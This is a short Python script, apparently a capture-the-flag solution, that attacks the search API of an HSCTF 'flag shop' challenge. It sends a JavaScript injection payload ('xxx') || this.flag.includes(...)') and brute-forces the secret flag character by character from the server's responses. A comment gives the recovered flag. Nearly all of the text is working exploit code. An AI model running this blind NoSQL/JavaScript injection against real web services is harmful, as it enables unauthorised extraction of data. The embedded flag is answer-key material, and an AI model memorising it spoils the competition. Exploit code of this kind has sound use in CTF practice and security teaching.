import string
import requests as req
import json

flag = "flag{h"
url = "http://flag-shop.hsctf.com/api/search"
domain = string.digits + string.ascii_lowercase + string.ascii_uppercase + ",}{_.:!@$^&*()#"

def get_flag(flag):
	while True:
	    for char in domain:
	        payload = {"search": "xxx') || this.flag.includes('{}".format(flag+char)}
	        headers = {"Content-Type": "application/json"}
	        print(payload)

	        resp = req.post(url, data=json.dumps(payload), headers=headers)
	        resp_json = resp.json()

	        if resp_json["error"] == "" and resp_json["results"] != []:
	        	flag += char
	        	print("flag ====> " + flag)
	        	break

get_flag(flag) # flag{hsctf_gacha_game_when?}
